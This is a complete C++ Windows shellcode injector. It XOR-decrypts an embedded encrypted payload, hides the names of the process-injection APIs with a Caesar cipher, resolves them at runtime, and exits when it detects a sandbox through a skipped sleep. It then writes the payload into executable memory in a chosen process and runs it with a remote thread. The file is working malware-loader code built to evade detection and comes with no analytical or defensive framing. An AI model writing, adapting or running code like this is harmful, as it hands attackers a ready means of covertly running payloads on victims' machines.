#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

using namespace std;

// Function prototypes
typedef HANDLE(WINAPI* OpenProcessType)(DWORD processId, BOOL  bInheritHandle, DWORD dwDesiredAccess);
typedef LPVOID(WINAPI* VirtualAllocExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef bool(WINAPI* WriteProcessMemoryType)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* CreateRemoteThreadType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);


void CaesarDecrypt(char* text, size_t size, int s) {
    for (size_t i = 0; i < size; ++i) {
        if (text[i] != '\0') {
            if (isupper(text[i]))
                text[i] = char(int(text[i] + s - 65) % 26 + 65);
            // Encrypt Lowercase letters
            else
                text[i] = char(int(text[i] + s - 97) % 26 + 97);
        }

    }
}

void decrypt(unsigned char* data, unsigned char* key, size_t data_len, size_t key_len) {
    for (size_t i = 0; i < data_len; ++i) {
        data[i] = data[i] ^ key[i % key_len];
    }
}

// Function to get the current tick count in milliseconds
DWORD64 GetTickCount64Wrapper() {
    return GetTickCount64();
}

// Function to sleep for a specified number of milliseconds
void SleepWrapper(DWORD milliseconds) {
    Sleep(milliseconds);
}

int main() {

    // Check for sleep skips
    DWORD64 startTickCount = GetTickCount64Wrapper();
    SleepWrapper(1000); // Sleep for 1 second
    DWORD64 endTickCount = GetTickCount64Wrapper();
    DWORD64 sleepDuration = endTickCount - startTickCount;

    // Check if sleep duration is less than expected (indicating a sleep skip)
    if (sleepDuration < 1000) {
        cout << "Sleep duration was less than expected. Possible sleep skip detected. Exiting..." << endl;
        exit(0);
    }
    else {
        cout << "Sleep duration was as expected." << endl;
    }

    // Define your encrypted shellcode directly
    unsigned char shellcode[] = { 0x9c, 0x1f, 0x21, 0x98, 0x67, 0xdd, 0xb8, 0xf9, 0x23, 0x8e, 0x9c, 0x82, 0x27, 0xc6, 0x62, 0x4f, 0xbc, 0xa4, 0x1f, 0xaa, 0x6d, 0x6, 0xa5, 0xee, 0xe6, 0xf7, 0x81, 0x60, 0xee, 0xfe, 0xbd, 0xe1, 0x75, 0x1e, 0x94, 0x3f, 0x21, 0x41, 0xd5, 0x3b, 0x95, 0xc1, 0xcb, 0xb3, 0xd0, 0xbb, 0xb5, 0x6a, 0xe3, 0x36, 0xa9, 0xa9, 0x7a, 0x1a, 0x8f, 0x83, 0x3, 0x47, 0x5b, 0x3c, 0xdc, 0x52, 0x28, 0x9c, 0xba, 0xdb, 0x90, 0x9f, 0xf3, 0x50, 0xfa, 0x4d, 0xc7, 0x72, 0x43, 0xc, 0xd9, 0xe5, 0xdd, 0x2c, 0x5, 0x15, 0x3e, 0x5d, 0x89, 0xd4, 0xd0, 0x10, 0x7d, 0x53, 0xff, 0x95, 0x23, 0xae, 0xea, 0x79, 0xe9, 0x56, 0x87, 0x98, 0x83, 0x9e, 0xa8, 0x52, 0x44, 0x2d, 0x42, 0xab, 0x7e, 0x45, 0xc7, 0x16, 0xed, 0xf9, 0xc2, 0x50, 0xc7, 0x12, 0x85, 0xe8, 0x55, 0x71, 0xdb, 0x6e, 0x47, 0x30, 0x1, 0xd5, 0xff, 0x21, 0x7b, 0x68, 0xc6, 0xf7, 0x2, 0xd9, 0xd0, 0xa8, 0x31, 0x15, 0x83, 0x16, 0xe9, 0x2, 0xb1, 0xa1, 0x88, 0x47, 0x4c, 0x7f, 0xe2, 0x29, 0x87, 0xaf, 0x8a, 0xd8, 0x6c, 0xbd, 0xda, 0x45, 0x25, 0x3, 0x25, 0x6d, 0x5e, 0xd6, 0x3c, 0x33, 0x21, 0x68, 0xb2, 0xc6, 0x8c, 0xed, 0x5a, 0x6, 0xc1, 0x64, 0xb8, 0xe6, 0x92, 0x3e, 0xd1, 0xdf, 0x27, 0x83, 0x4e, 0xf0, 0xac, 0x41, 0xcd, 0x91, 0x14, 0x36, 0xe6, 0x7a, 0x98, 0x7e, 0xba, 0x3f, 0x6c, 0xa1, 0xf9, 0x4, 0x9b, 0x3d, 0x40, 0xd0, 0xf3, 0xbb, 0x16, 0xf3, 0x5a, 0x71, 0xbf, 0xa, 0x9f, 0xb3, 0x2f, 0x25, 0x45, 0x46, 0x4a, 0x88, 0xd6, 0x83, 0xeb, 0x3d, 0x6c, 0xfa, 0xd, 0x94, 0x56, 0x58, 0x66, 0x13, 0x1d, 0xe6, 0xca, 0x24, 0x54, 0xee, 0x24, 0x84, 0x7e, 0x67, 0xe4, 0xc5, 0x40, 0x67, 0xd9, 0x9a, 0x21, 0xdd, 0x6f, 0xcc, 0x3c, 0xa0, 0x98, 0xd2, 0xa1, 0xb7, 0xe9, 0xef, 0x5f, 0x40, 0xc1, 0x13, 0xac, 0x93, 0xc8, 0xc1, 0xef, 0x32, 0xa6, 0x67, 0x0, 0x61, 0xbb, 0x12, 0xb7, 0x5a, 0xf4, 0xe7, 0xd2, 0xdc, 0x53, 0x2d, 0x0, 0x7f, 0x76, 0xb7, 0xc3, 0xf3, 0x98, 0xbb, 0xad, 0x86, 0x4b, 0x7b, 0x73, 0x6, 0xd6, 0xa1, 0x4e, 0x18, 0x87, 0xa6, 0x99, 0x40, 0x6b, 0x20, 0x95, 0x7e, 0xe, 0x5c, 0x4d, 0x8b, 0x36, 0xee, 0x3f, 0x9d, 0xfe, 0xad, 0xb0, 0x68, 0xed, 0xf6, 0x37, 0xfd, 0xea, 0x15, 0x30, 0x24, 0x6e, 0x47, 0x96, 0x19, 0x30, 0x4, 0x1e, 0x8f, 0x9a, 0x2, 0x8f, 0xb7, 0xad, 0x6a, 0xc, 0x44, 0xb0, 0x42, 0x24, 0x4e, 0x3a, 0xc8, 0xae, 0x8c, 0x6a, 0x4c, 0xb7, 0x8a, 0xe8, 0x8, 0xb6, 0x49, 0xc5, 0x9d, 0x1f, 0xdb, 0x91, 0x56, 0x96, 0xea, 0x4b, 0x64, 0x41, 0x55, 0xa4, 0x69, 0x6f, 0x7e, 0x37, 0x7b, 0x99, 0x90, 0xf6, 0x8b, 0x5e, 0x61, 0x68, 0x8f, 0x79, 0xff, 0x53, 0x84, 0xad, 0x6, 0x9e, 0x20, 0xd1, 0x1d, 0x5d, 0x3b, 0x34, 0xd2, 0xd6, 0x1, 0xf4, 0x1d, 0x45, 0xc2, 0x93, 0x47, 0xba, 0x18, 0x59, 0x4d, 0x84, 0xe2, 0x4, 0x4c, 0x46, 0xaa, 0x72, 0xdd, 0x46, 0x95, 0x45, 0x94, 0x1b, 0x1c, 0xfc, 0x21, 0xc9, 0xf7, 0x39, 0x1b, 0x99, 0x76, 0x3a, 0x91, 0x99, 0x3f, 0x8a, 0x62, 0xa4, 0x60, 0xe6, 0x64, 0xf4, 0xad, 0xe, 0xa5, 0x27, 0x39, 0x97, 0xc6, 0xc6, 0x30, 0x1c, 0x87, 0x97, 0x93, 0x55, 0x51, 0x2b, 0x7a, 0xdb, 0x38, 0x3f, 0xb4, 0xc3, 0xe0, 0x92, 0x45, 0x95, 0xda, 0x73, 0xf5, 0x32, 0xaf, 0x30, 0x58, 0xa4, 0x60, 0x77, 0x0, 0xc9, 0x11, 0x44, 0xa9, 0x42, 0x0, 0x3, 0x7f, 0x42, 0xc2, 0xa1, 0x3b, 0x7c, 0x3b, 0x9d, 0x82, 0x99, 0x9d, 0x3e, 0xff, 0x19, 0xb3, 0x88, 0xf1, 0xea, 0x22, 0x14, 0xd0, 0x52, 0xf9, 0xf7, 0xb5, 0x36, 0x2, 0xe5, 0xd0, 0x2a, 0xd5, 0x34, 0xc4, 0x94, 0x9b, 0xf2, 0xa9, 0x42, 0x7b, 0x9f, 0x99, 0x87, 0x99, 0x91, 0x4, 0xd7, 0x70, 0x7, 0x33, 0x99, 0xf5, 0xc8, 0x7b, 0x7e, 0x65, 0xf5, 0x42, 0x8a, 0xb4, 0xad, 0x9d, 0x1, 0xa5, 0xaf, 0x63, 0x7a, 0x1f, 0x7b, 0xd0, 0xde, 0xe8, 0xa4, 0x2, 0xf0, 0x83, 0xa7, 0xa6, 0x5c, 0x3c, 0x78, 0x7, 0x67, 0xac, 0xce, 0xb6, 0x43, 0x51, 0x9c, 0x59, 0x91, 0x93, 0xc8, 0x9a, 0x47, 0x3d, 0x85, 0x40, 0xb, 0x8d, 0x73, 0x93, 0xc5, 0xd6, 0x7d, 0xac, 0x59, 0xed, 0x3b, 0xdf, 0x8b, 0x38, 0x76, 0xbb, 0x9a, 0x55, 0x7a, 0xa9, 0xfb, 0xdf, 0x19, 0xf1, 0xd3, 0xf7, 0xed, 0x4e, 0x3, 0x93, 0x60, 0xd7, 0x57, 0x7e };
    // Define your decryption key
    unsigned char key[] = { 0x60, 0x57, 0xa2, 0x7c, 0x97, 0x35, 0x74, 0xf9, 0x23, 0x8e, 0xdd, 0xd3, 0x66, 0x96, 0x30, 0x7, 0x8d, 0x76, 0x7a, 0xe2, 0xe6, 0x54, 0xc5, 0xbf, 0xb0, 0xbf, 0xa, 0x32, 0xf6, 0xb6, 0x36, 0xb3, 0x55, 0x56, 0x9b, 0x88, 0x6b, 0xb, 0x98, 0xa, 0x5c, 0x89, 0x40, 0xc1, 0x80, 0xf3, 0x84, 0xaa, 0x4f, 0xa, 0xc8, 0xd5, 0x78, 0x36, 0xaf, 0xc2, 0xc2, 0x8e, 0x56, 0x7d, 0xdd, 0x93, 0xca, 0x71, 0xe8, 0x9a, 0xc1, 0xd7, 0x78, 0x2, 0xda, 0xc6, 0x85, 0x4e, 0xb, 0xd, 0x9, 0x83, 0x5c, 0x54, 0x1d, 0x1e, 0x3c, 0x52, 0xc, 0xa6, 0xd0, 0x10, 0x7d, 0xd8, 0x7f, 0x1d, 0x23, 0xae, 0xea, 0x31, 0x6c, 0x96, 0xf3, 0xff, 0xcb, 0x9f, 0x78, 0xd9, 0xc, 0x35, 0x12, 0xef, 0xf5, 0x5, 0xe7, 0x5f, 0xec, 0x29, 0x21, 0x6, 0x8a, 0x23, 0x4c, 0xa0, 0xaa, 0xb8, 0x9a, 0xe5, 0x73, 0xb8, 0x49, 0xd4, 0x29, 0x69, 0x4a, 0xa8, 0x87, 0x36, 0xcb, 0xd4, 0x7c, 0xe9, 0x30, 0xd4, 0xbb, 0xf6, 0x9c, 0xf3, 0xfd, 0xa2, 0xc4, 0x63, 0x44, 0x3a, 0xdb, 0xf8, 0xf2, 0x77, 0xd2, 0x9c, 0xe7, 0xfd, 0xfe, 0xc, 0x24, 0xd3, 0x43, 0x2c, 0xd5, 0xda, 0x74, 0x77, 0xaa, 0x28, 0xae, 0x8f, 0x8d, 0x3d, 0x1b, 0x8d, 0xc5, 0xec, 0xf0, 0xe7, 0x42, 0x7f, 0x89, 0x9e, 0x7f, 0xdd, 0x17, 0xaa, 0xed, 0x19, 0x8c, 0xc8, 0x55, 0x6c, 0xae, 0xf9, 0x74, 0x5e, 0xfb, 0x6d, 0x93, 0x41, 0xa1, 0x45, 0xc2, 0x67, 0x8, 0x5b, 0xe1, 0x52, 0x5d, 0xc, 0xa5, 0x8e, 0xe2, 0x42, 0xae, 0x68, 0x7c, 0x6c, 0xfb, 0x31, 0x23, 0xe6, 0xbf, 0xed, 0x8e, 0x49, 0x6c, 0xbb, 0x5b, 0xdc, 0xdf, 0xb9, 0x2f, 0xd4, 0xdf, 0xaa, 0xbd, 0x2, 0x53, 0x11, 0xf1, 0xd7, 0x2d, 0x2f, 0x6d, 0x24, 0x13, 0x3d, 0x94, 0xab, 0xe1, 0x90, 0x5e, 0x5, 0x6f, 0xf3, 0xd1, 0x68, 0x9b, 0xe1, 0x90, 0x48, 0x5f, 0x40, 0xc1, 0x13, 0x53, 0x46, 0x20, 0xcf, 0xef, 0x32, 0xa6, 0x56, 0x39, 0x53, 0x95, 0x23, 0x81, 0x62, 0xda, 0xd5, 0xfc, 0xed, 0x61, 0x14, 0x0, 0x25, 0x3e, 0x3e, 0x2, 0xba, 0x5f, 0x7b, 0x56, 0xa6, 0x4b, 0x7b, 0x3e, 0x37, 0x1f, 0xf2, 0x1d, 0x72, 0x84, 0xf5, 0xd0, 0xfa, 0x3c, 0xa9, 0xa, 0xb8, 0xe, 0x5c, 0x4d, 0x8b, 0xc9, 0x3b, 0xd7, 0xf6, 0xfe, 0xad, 0xb0, 0x47, 0xbe, 0xa0, 0x2, 0x8f, 0xa8, 0x61, 0x2, 0x6b, 0x1b, 0x3f, 0xaf, 0x4e, 0x75, 0x35, 0x7d, 0xdd, 0xd7, 0x2f, 0xc9, 0x81, 0xee, 0x1d, 0x39, 0x72, 0x86, 0x7, 0x45, 0x5, 0x4e, 0x9a, 0xc6, 0xee, 0xb, 0x75, 0xdf, 0xcd, 0x92, 0x3a, 0x81, 0xc, 0x94, 0xdf, 0x52, 0xac, 0xa4, 0x21, 0xda, 0x85, 0xa, 0x53, 0x6c, 0x0, 0xf2, 0x39, 0x1b, 0x26, 0x45, 0x21, 0xf2, 0xc6, 0xa9, 0xe4, 0x8, 0x34, 0x38, 0xe2, 0x2e, 0xae, 0x38, 0xd4, 0xff, 0x7e, 0xc4, 0x41, 0x96, 0x5e, 0x15, 0x6a, 0x73, 0x96, 0xe7, 0x55, 0x92, 0x24, 0x34, 0x92, 0xa2, 0x2a, 0xd7, 0x7a, 0x3, 0x79, 0xc0, 0xaa, 0x50, 0x1b, 0x2f, 0xc5, 0x41, 0x88, 0x19, 0xf2, 0x2c, 0xe1, 0x57, 0x1c, 0xb4, 0xa8, 0x8, 0xa4, 0x63, 0x5a, 0xc1, 0x3b, 0xb, 0x58, 0xca, 0x77, 0x32, 0x62, 0xa6, 0x48, 0x62, 0x64, 0xf4, 0xad, 0xe, 0xf5, 0x74, 0x6a, 0xde, 0x1, 0x4, 0xdb, 0x49, 0xa9, 0xac, 0x6c, 0x80, 0x19, 0xa2, 0xbc, 0xb1, 0x32, 0x60, 0xe7, 0x99, 0xa8, 0x1b, 0xb4, 0xd8, 0xeb, 0xba, 0xb8, 0x3, 0x66, 0x63, 0xb, 0xed, 0xa7, 0xb5, 0x2d, 0xcf, 0x9, 0x3f, 0x56, 0x97, 0x85, 0xc3, 0xa, 0x5d, 0x8a, 0x66, 0xfa, 0xf4, 0x28, 0x9d, 0x82, 0xd0, 0x27, 0x7a, 0xf, 0x2c, 0x53, 0x88, 0xf1, 0xea, 0x22, 0xeb, 0x5, 0x1a, 0x6, 0x38, 0xc1, 0x34, 0xe9, 0x29, 0x38, 0x7f, 0xd5, 0x34, 0xc4, 0xc7, 0xc2, 0x98, 0xe9, 0x18, 0x32, 0x16, 0x48, 0x46, 0x7b, 0x81, 0x4d, 0x10, 0xb0, 0x7, 0x23, 0x99, 0xf5, 0x81, 0xc1, 0x26, 0xc1, 0xa6, 0xa7, 0x8a, 0xb4, 0xad, 0x9d, 0xfe, 0x70, 0xe7, 0xf0, 0x29, 0x4c, 0x33, 0x59, 0x39, 0xa0, 0x2d, 0xf3, 0xb8, 0xa, 0x7d, 0xef, 0x9b, 0xfc, 0x78, 0x27, 0x67, 0xac, 0x87, 0x3f, 0xba, 0x18, 0x26, 0x4b, 0x7, 0x1a, 0x2a, 0x9a, 0x47, 0x3d, 0x85, 0xbf, 0xde, 0xc5, 0xf0, 0x57, 0xe5, 0x53, 0xbd, 0xd8, 0xeb, 0x8b, 0xb0, 0xd8, 0xc3, 0x39, 0xb5, 0x3e, 0x5a, 0x20, 0xa8, 0xf1, 0x38, 0x87, 0x73, 0xf1, 0x8a, 0xbe, 0x2a, 0x8c, 0xf3, 0x26, 0xc2, 0x81, 0xa8, 0xab };

    // Decrypt the shellcode
    size_t shellcodeSize = sizeof(shellcode);
    size_t keySize = sizeof(key);
    decrypt(shellcode, key, shellcodeSize, keySize);

    // Enter the process ID to inject into
    cout << "Enter Process ID to inject: ";
    DWORD processId;
    cin >> processId;

    // Encrypted names using Caesar cipher
    char openProcessName[] = "UvktVxuikyy";
    char virtualAllocExName[] = "ZmvxyepEppsgIb";
    char writeProcessMemoryName[] = "TofqbMolzbppJbjlov";
    char createRemoteThreadName[] = "YnawpaNaikpaPdnawz";

    // Decrypt function names
    CaesarDecrypt(openProcessName, sizeof(openProcessName), 26 - 6);
    CaesarDecrypt(virtualAllocExName, sizeof(virtualAllocExName), 26 - 4);
    CaesarDecrypt(writeProcessMemoryName, sizeof(writeProcessMemoryName), 26 - 23);
    CaesarDecrypt(createRemoteThreadName, sizeof(createRemoteThreadName), 26 - 22);

    // Dynamically load the functions
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    OpenProcessType pOpenProcess = (OpenProcessType)GetProcAddress(kernel32, openProcessName);
    VirtualAllocExType pVirtualAllocEx = (VirtualAllocExType)GetProcAddress(kernel32, virtualAllocExName);
    WriteProcessMemoryType pWriteProcessMemory = (WriteProcessMemoryType)GetProcAddress(kernel32, writeProcessMemoryName);
    CreateRemoteThreadType pCreateRemoteThread = (CreateRemoteThreadType)GetProcAddress(kernel32, createRemoteThreadName);

    // Check if the function pointers were obtained successfully
    if (!pOpenProcess || !pVirtualAllocEx || !pWriteProcessMemory || !pCreateRemoteThread) {
        std::cerr << "Failed to get function pointers." << std::endl;
        return 1;
    }


    // Open the process
    HANDLE hProcess = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, processId);

    if (hProcess == NULL) {
        cout << "Failed to open process. Error code: " << GetLastError() << endl;
        return 1;
    }

    cout << "Got procHandle: " << hProcess << endl;

    // Allocate memory for the shellcode in the target process
    LPVOID execMemory = pVirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMemory) {
        cerr << "VirtualAlloc failed." << endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Move the decrypted shellcode into the allocated memory
    if (!pWriteProcessMemory(hProcess, execMemory, shellcode, shellcodeSize, NULL)) {
        cerr << "WriteProcessMemory failed." << endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Create a thread to execute the shellcode
    DWORD threadId;
    HANDLE threadHandle = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, &threadId);
    if (!threadHandle) {
        cerr << "CreateRemoteThread failed." << endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the thread to complete
    WaitForSingleObject(threadHandle, INFINITE);

    // Clean up
    CloseHandle(threadHandle);
    CloseHandle(hProcess);

    cout << "Execution completed." << endl;

    return 0;
}